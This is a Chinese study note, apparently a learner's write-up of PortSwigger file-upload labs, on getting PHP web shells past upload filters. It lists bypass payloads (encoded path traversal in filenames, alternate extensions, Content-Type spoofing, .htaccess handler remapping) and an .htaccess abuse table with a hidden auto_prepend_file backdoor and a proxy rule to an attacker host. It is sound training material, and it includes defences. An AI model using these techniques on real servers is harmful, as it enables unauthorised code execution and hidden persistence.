# 2026-09-18(续) PortSwigger 文件上传实战：路径穿越 + 后缀黑名单（决策型笔记）

> 状态：✅ 实操过（Lab 3、Lab 4 通关）
> 靶场：PortSwigger Web Security Academy · File upload vulnerabilities
> 关联：[文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) · [中间件解析漏洞](./2026-07-31-文件上传解析漏洞.md) · [WAF 绕过与防御](./2026-08-02-文件上传WAF绕过与防御.md)

## 零、这篇笔记怎么用（先看这段）

我以前的上传笔记是**知识型**的：知道有 `.htaccess`、知道有路径穿越、知道有黑白名单，但**换一个目标就不知道该拿哪把钥匙**，还得现查新知识。

这篇按**决策**写：**先看现象 → 判定卡在第几层 → 查表拿钥匙**。以后实战遇到上传点，直接从「三、决策卡」开始查；两道题的具体过程在「四、五」。

---

## 一、一句话认知

**「能不能传上去」和「传上去能不能执行」是两套完全独立的系统。**

| 层 | 谁在管 | 管什么 | 卡住的后果 |
|---|---|---|---|
| **应用层**（上传接口代码） | 后端校验逻辑 | 文件能不能**落盘**：后缀黑白名单 / Content-Type / 内容检测 / 体积 / 文件名清洗 | 传不上去，请求被拒 |
| **服务器层**（Web 服务器 / 引擎） | 服务器配置 | 落盘的文件会不会**被执行**：后缀 → handler 映射表、目录是否允许执行 | 传上去了，但只是躺在服务器上，GET 出来是**源码** |

**绕第一层 = 只是把文件放到服务器上；要 RCE 必须同时拿下第二层。**
Lab 4 的 `.php3` 就是活教材：黑名单放行了它，但引擎映射表里没有它 → 上传成功 ≠ 能执行。

---

## 二、谁决定「执行」：不是 PHP，是 Web 服务器

```
我: GET /files/avatars/shell.pwnx
  ↓
【Web 服务器】① URL → 磁盘路径
              ② ⭐决策点：取后缀，查自己的「后缀 → 处理器」映射表
                   .php  → application/x-httpd-php → 交给 PHP 引擎
                   .php3 → 表里没有这一行 → 当静态文件直接吐出去（=「上传成功但不解析」）
                   .pwnx → 我写进 .htaccess 之后表里才有 → 交给 PHP 引擎 ✅
  ↓
【PHP 引擎】只管执行被递过来的文件，全程不看文件名/后缀
```

**实测铁证（本机 phpStudy 的 php.exe）**：把一个内容为 `<?php echo 7*191; ?>` 的文件命名成 `.133t` 用 CLI 执行 → 正常输出 `1337`。
⇒ **PHP 解释器对后缀零意见**；`.php3` 不执行纯粹是服务器映射表里没它。

类比（Windows 用户秒懂）：双击一个文件能不能打开，是**注册表里的「文件关联」**决定的，后缀本身毫无含义。Apache 的那张映射表就是它的「注册表」，而 `.htaccess` = **我被允许在某个目录里写的一小片注册表**。

| 栈 | 谁决定「后缀 → 执行」 | 配置写在哪 |
|---|---|---|
| Apache + mod_php | mod_mime 的类型/处理器映射表 | httpd.conf / **.htaccess** |
| nginx + PHP-FPM | `location ~ \.php$ { fastcgi_pass ... }` 正则 | server 块（**没有目录级配置**） |
| IIS | 处理程序映射 | **web.config** |
| PHP-FPM（CGI） | 同上，另外读 **.user.ini** | .user.ini |
| Flask / Node | 压根没有「脚本后缀」概念，静态目录由代码直出 | 应用代码 |

👉 所以**必须先把栈定下来**（看响应头 `Server`），再决定拿哪把钥匙 —— nginx 站上 `.htaccess` 这条路**根本不存在**。

---

## 三、决策卡 ⭐（实战就查这一节）

### 3.1 第一层：传得上去吗？

| 现象 | 大概率是 | 我该做什么（钥匙） |
|---|---|---|
| 提示「不允许 .php 扩展名」 | 后缀**黑名单** | 一次只变一个维度穷举：没被列的后缀（`.php5 .phtml .phar .pht .inc`）、大小写（`.PHP`）、双扩展名（`x.php.jpg`）、尾点尾空格（`x.php.`）。⚠️ 记住：**穷举只解决第一层** |
| 提示「只允许 jpg/png/gif」 | 后缀**白名单** | 别硬碰后缀 → 换路线：容器的解析特性（多后缀 `x.php.jpg`）、内容检测绕过（图片马）、目录级配置（`.user.ini`）、改文件名参数 |
| 提示 Content-Type 不允许 | MIME 校验 | 抓包把 `Content-Type` 改成站点在用的真实类型（`image/jpeg`） |
| **400 / missing parameter** | **字段缺失或字段名不对** | 400 = "字段名不对"的信号，**不是"被过滤了"**！回 multipart 体数 part：常见必有「隐藏字段（如 `user`）+ 文件字段（如 `avatar`）」 |
| 前端弹窗拦、请求没发出去 | 前端校验 | 关 JS / Burp 抓包直接重放（前端校验等于没有） |
| 上传成功但响应 500 | 服务端接了但处理失败 | **别当失败** —— 说明它确实拿到了文件，值得继续追 |

### 3.2 第二层：落到哪了？

| 现象 | 钥匙 |
|---|---|
| 上传响应**回显存储路径** | **免费探针**：直接拿回显的路径去 GET（Lab 3 就是靠它读出"清洗结果"） |
| 没有回显 | **落点探针**：传个无害 `.txt`，分别在「上传目录」和「上一级目录」各 GET 一次，**哪个 URL 返 200 就是落在哪**（判据是 URL，不是"上传成功"） |
| 想写到别的目录 | `filename` 里做穿越：字面 `../` 被清洗 → **编码斜杠 `..%2f`**（说明清洗在解码**之前**）；被"只删一遍" → **套娃 `....//`**；只能写绝对路径 → 绝对路径会**丢掉前面的目录**（`os.path.join`/`Path.Combine` 特性） |
| 文件名/目录完全不可控 | 换攻击面：写模板目录 → SSTI；写静态目录 → 同源 XSS；覆盖已有文件（`.user.ini` / `.htaccess` / 模板） |

### 3.3 第三层：执行了吗？—— ⭐ 全篇最重要

**先看响应头（不要靠眼睛看内容）**：

| GET 的响应头 | 结论 |
|---|---|
| `Content-Type: text/plain` + `Last-Modified` + body 是源码 | 静态直出，**没执行** |
| `Content-Type: text/html` + **`Set-Cookie`** + 无 `Last-Modified` | 引擎编译执行了 ✅ |
| **304** | 障眼法（浏览器缓存），带 `?v=1` 重发再看真实 200 |

**「没执行」有两条完全不同的分岔 —— 先分岔，再选钥匙**（这就是我以前"不知道用哪种方式"的根源）：

| 分岔 | 怎么判定 | 钥匙 |
|---|---|---|
| **A. 目录被关了执行**（位置问题） | 同一个目录里**任何**脚本后缀都不执行；跨目录写出去就能执行 | **路径穿越**：把文件写到可执行目录（Lab 3） |
| **B. 我的后缀不被引擎认**（类型映射问题） | 同目录里**别的**后缀能执行（拿 `.php .phtml .phar .php5` 各传一次对照）；或站点是 Apache | **改服务器的映射表**：`.htaccess`（Apache）/ `web.config`（IIS）/ `.user.ini`（PHP-FPM）（Lab 4） |
| **C. 服务器压根没有脚本引擎** | Flask/Node 站，响应头永远是静态资源语义 | 放弃 RCE，换 **同源 XSS / SSTI** |

> 判定顺序：**先问"是位置问题还是类型问题"**，再决定是穿越还是改配置。选错方向 = 白试十几次。

### 3.4 一句话总览

```
传得上去吗？（黑白名单/Content-Type/字段名）
   └─ 传上去了 → 落到哪了？（回显 / 落点探针 / 穿越）
        └─ 落对了 → 执行吗？（响应头三条判据）
             └─ 不执行 → 位置问题？→ 穿越
                        类型问题？→ 改映射（.htaccess/web.config/.user.ini）
                        没引擎？  → 换 XSS/SSTI
```

---

## 四、Lab 3：Web shell upload via path traversal
### 3.5 第一层的两个实证（Lab 1 / Lab 2）

| Lab | 服务端检查什么 | 钥匙 |
|---|---|---|
| 1 Remote code execution via web shell upload | **什么都不查** | 直接传 `.php` → GET 即执行（零防护，不需要任何绕过） |
| 2 Web shell upload via Content-Type restriction bypass | **只查 Content-Type**（不看后缀、不看内容） | 只改它检查的那一个维度：multipart 里文件 part 的 `Content-Type: image/jpeg` |

⇒ **判据：服务端"看什么"，我就"改什么"** —— 绕过永远针对它实际检查的那个维度，别做无用功。


**题目**：头像上传。服务器"禁止执行用户提供的文件"，要拿到 `/home/carlos/secret` 并提交。

**思路**：上传本身没被拦（能传 PHP）→ 但传上去 GET 出来是**源码**（说明这个目录不执行）→ 卡在第二层 → 分岔判断：**是位置问题**（目录执行被关）→ 钥匙 = **在 filename 上做路径穿越，把文件写到上一级可执行目录**。

**过程**

1. 传 `exploit.php`（内容读 carlos 的 secret）→ GET `/files/avatars/exploit.php` → **回源码纯文本**（= 上传成功、该目录不解析）。
   我一开始的错误：拿着这个 GET 请求去换文件名 —— **没用的**，换的只是"取哪个文件"，**目录没变**，所以照样不解析。
2. 真正能改"落盘位置"的地方只有一个：`POST /my-account/avatar` 里那个 part 的 `Content-Disposition: ...; filename="..."`。
3. `filename="../exploit.php"` → 上传响应回显 `The file avatars/exploit.php has been uploaded` ⇒ **`../` 被清洗掉了**（⚠️ 别在这里判"穿越被堵死"，这是最常见的误判）。
4. `filename="..%2fexploit.php"` → 回显变成 `The file avatars/../exploit.php has been uploaded` ⇒ **`../` 活下来了**。
   ⇒ 结论：服务端是**先清洗、后 URL 解码**，我编码斜杠就能绕过。
5. 回账号页刷新头像 → Burp 历史里 `GET /files/avatars/..%2fexploit.php` → 响应里就是 secret（这次真的执行了）。

**怎么识别命中**：① 上传响应**回显最终存储路径**（免费探针）；② `../` 消失了 vs 回显里带着 `../` —— 这一对差异直接照出「清洗在哪一层」。

**踩坑**
- 看到"回源码"以为上传失败了 → 其实是**该目录不执行**的证据。
- 用 GET 请求的文件名去换 → 改了取文件的名字，改不了落盘位置。
- 看到第一个响应（`../` 被剥）就下结论"穿越不可行"。

**后端缺陷（还原）**
```php
// ❌ 只做一次字面替换，而且【清洗在解码之前】
$name = str_replace("../", "", $_FILES['avatar']['name']);
$name = urldecode($name);                       // 解码在后 → %2f 借尸还魂
move_uploaded_file($tmp, "/var/www/images/avatars/" . $name);
```
**防御一句话**：只取文件名（`basename()`/`Path.GetFileName()`）+ 后缀白名单 + **服务端随机重命名**，永远不拼接用户提供的路径。

---

## 五、Lab 4：Web shell upload via extension blacklist bypass

**题目**：`.php` 等后缀被黑名单拦，题面提示「黑名单的**配置**上有个根本缺陷」。

**思路**：黑名单是「**穷举坏东西**」，而"坏"是开放集合：总有没列到的后缀、总有**没有后缀的文件名**。所以不要只做后缀穷举 —— 要问：**谁能改变"某个后缀被当成什么类型解析"？** 答案是 **Apache 的目录级配置 `.htaccess`**，而它自己**没有后缀**，黑名单从设计上就看不见它。

**过程**

1. 响应头确认站点是 **Apache**（先定栈）。
2. `filename=".php3"` → **能传上去，但不解析** ⇒ 教学点：黑名单放行了它，但引擎映射表里没有这一行。**上传成功 ≠ 能执行。**
3. 传 `.htaccess`：`filename=".htaccess"`，**`Content-Type` 改成 `text/plain`**，内容 = 一条把自造后缀映射成 PHP 的指令。
4. 回原上传请求，把 payload 后缀换成**自己编的那个**（两边必须逐字符一致）→ 上传成功。
5. GET `/files/avatars/exploit.<自造后缀>` → 响应头出现 `Set-Cookie` / `Content-Type: text/html` ⇒ **执行了**，拿到 secret。

**怎么识别命中**：GET 的响应头从"静态资源语义"变成"动态执行语义"（见 3.3 表）。

**踩坑（我实际翻车的）**
- ⭐ **`.133t`（数字 1）vs `.l33t`（小写字母 L）** —— 一个字符之差，映射表匹配失败，症状就是"代码没解析"。**Apache 比对后缀是纯字符串比较**，形近字符是隐形杀手。
  → 教训：**自造后缀要避开 `l / 1 / I / O / 0` 这类形近字符**（我用 `.pwnx` 这种最稳），并且 `.htaccess 里写的后缀` 与 `文件名后缀` 要**逐字符核对**。
- 顺序不能反：**先放配置、再传 payload**（配置对已存在文件的处理不会重来一遍）。
- 上传 `.htaccess` 那一步的 `Content-Type` 要 `text/plain`（容易漏）。

**后端缺陷（还原）**
```php
// ❌ 黑名单只枚举"脚本后缀"，而且用【原始文件名】落盘
$ext = strtolower(pathinfo($_FILES['avatar']['name'], PATHINFO_EXTENSION));
if (in_array($ext, ['php','phtml','php3','php4','php5'])) reject();
move_uploaded_file($tmp, "images/avatars/" . $_FILES['avatar']['name']);  // .htaccess 原名落盘 😱
```
**防御一句话**：**白名单后缀**（枚举好的）+ **拒绝无后缀 / 点开头 / 双扩展名**的文件名 + **随机重命名** + Apache 上传目录 `AllowOverride None` + 上传目录移出 DocumentRoot。
（黑名单为什么注定漏：它在枚举"坏"，而"坏"是开放集合；白名单枚举"好"，是收敛的 —— 这才是能写进报告的答案。）

---

## 六、`.htaccess` 速查（我以后要背的）

**是什么**：Apache 的**目录级配置**，影响所在目录**及其全部子目录**，能覆盖上层配置；**每个请求都重新读**（改完立即生效，不用重启）。

**生效前提**：服务器 `AllowOverride` 放权 —— `AddType` 属 **FileInfo** 类、`php_value/php_flag` 属 **Options** 类。
`AllowOverride None` → 文件被**静默忽略**；放权范围不够 → **500**。

**语法**：一行一条指令、`#` 注释、**不写分号**（和 C++ 不同）、后缀**大小写敏感**、写错指令 → 该目录 **500**。

```
# 把自造后缀映射成 PHP
AddType application/x-httpd-php .pwnx

<FilesMatch "\.pwnx$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

⭐ **哨兵技巧（实战超实用）**：不确定目标读不读 `.htaccess` → 故意传一条**非法指令**进去：
- 该目录立刻 **500** ⇒ 它**确实被读了**（AllowOverride 有效），放手用
- 页面毫无变化 ⇒ 没被读，**立刻换思路**，别浪费时间

**能写 `.htaccess` = 拿到该目录的"服务端行为控制权"**：

| 目的 | 指令 | 说明 |
|---|---|---|
| **改解析 = RCE** | `AddType application/x-httpd-php .pwnx` | mod_php 已内置该 handler，不用装东西 |
| 反向关掉解析 | `RemoveHandler .php` / `php_flag engine off` | 破坏别人留的 shell、绕过"目录不许脚本"的校验 |
| **隐形后门** | `php_value auto_prepend_file /path/evil.txt` | 该目录**所有** .php 执行前先跑我的代码 —— 不动任何 .php 文件，最难排查 |
| 把站点变代理 | `RewriteEngine On` + `RewriteRule ^(.*)$ http://attacker/ [P]` | 反向代理转发，配 SSRF/白名单绕过 |
| 同源 XSS | 把 `.jpg/.txt` 映射成 `text/html`；`ErrorDocument 404 /evil.html` | 门槛比 RCE 低 |
| 信息/权限 | `Options +Indexes`（目录列表）、`php_flag display_errors on`（泄路径） | |
| 认证欺骗 | `AuthType Basic` + `AuthUserFile`（指向自己传的文件） | |

**同类物**：

| 文件 | 谁读它 | 招牌利用 | 坑 |
|---|---|---|---|
| `.htaccess` | Apache | `AddType` 改解析 | 需 FileInfo 放权 |
| **`.user.ini`** | **只有 PHP-FPM/CGI，mod_php 不读** | `auto_prepend_file=/tmp/x.txt` | ⚠️ **默认 300 秒缓存**，传完不立刻生效，别误判失败 |
| `web.config` | IIS | `<handlers>` 加新后缀映射 | 同思路 |
| （无） | nginx | — | **nginx 没有目录级配置**，这条路不通 |

---

## 七、踩坑清单（我自己踩过的）

1. **拿到"加载图片的 GET 请求"去换文件名** —— 换的是"取哪个文件"，改不了"文件落在哪"。落盘位置只在**上传请求的 `filename`** 里。
2. **看到源码回显就以为上传失败** —— 那是「该目录不执行」的证据，是**线索**不是失败。
3. **看到 `../` 被清洗就放弃穿越** —— 换个编码（`..%2f`）或套娃（`....//`）再试。
4. **`.php3` 能传但不解析** —— 黑名单列了它、引擎不认它，这是**历史错位**；卡住先想想"黑名单 ≠ 引擎映射表"。
5. **`.133t` / `.l33t` 形近字符** —— 一个字符之差全盘失效；自造后缀避开 `l/1/I/O/0`。
6. **400 / missing parameter** = 字段（名）缺失，不是"被过滤"。
7. `304` 是浏览器缓存障眼法，带 `?v=1` 再看。

---

## 八、方法论沉淀

1. **两层模型**：上传漏洞永远先问「能不能落盘」和「能不能执行」，**这两件事由不同的系统管**。
2. **卡住先分岔，别急着试 payload**：位置问题（穿越）vs 类型问题（改映射）vs 没引擎（换 XSS/SSTI）。选错方向 = 白试十几次。
3. **先定栈，再定手法**：响应头 `Server` 决定 `.htaccess` / `web.config` / 什么都没有。
4. **失败时先分辨"错在哪一层"**：`l/1` 那种一个字符的差异，落在"映射匹配"这一层，不是"绕过"这一层。
5. **响应头是判据，不是内容**：静态直出 vs 引擎执行，一眼就能分开（我再也不靠"看有没有输出"猜了）。
6. **免费探针优先**：上传响应回显路径 / `.htaccess` 哨兵 —— 能用一个请求定性，就别猜。
7. **黑名单是开放集合，白名单才收敛** —— 这句话既是攻击思路也是修复建议。

---

## 九、待实践

- [ ] 在自己 phpStudy（Apache + PHP）上复刻 `.htaccess` 实验，顺便看 `httpd.conf` 与 php 模块里 `FilesMatch` 的默认规则 —— 搞清楚**哪些后缀默认就被交给 PHP**（这样以后先穷举、再改配置）
- [ ] 继续打完 file upload 模块：Lab 5 obfuscated file extension（空字节截断）、Lab 6 polyglot、Lab 7 race condition
- [ ] 把「三、决策卡」拿 upload-labs 的关卡复盘一遍（20 关检测逻辑已核对过，正好对照）
- [ ] 实战/SRC 遇到上传点时，用 3.3 的分岔表先判"位置问题还是类型问题"，把结果补进这篇

## 关联笔记

- [文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) · [中间件解析漏洞](./2026-07-31-文件上传解析漏洞.md) · [WAF 绕过与防御](./2026-08-02-文件上传WAF绕过与防御.md)
- [CCP 实操带练：文件包含 / RCE / 上传绕过](./2026-09-16(续)-CCP实操带练-文件包含与RCE与上传绕过.md)
- 靶场进度：[PortSwigger-Lab-做题进度.md](./PortSwigger-Lab-做题进度.md)

> ⚠️ 声明：以上内容仅用于授权环境（靶场 / CTF / 书面授权的渗透测试），未经授权对真实目标使用属违法行为。
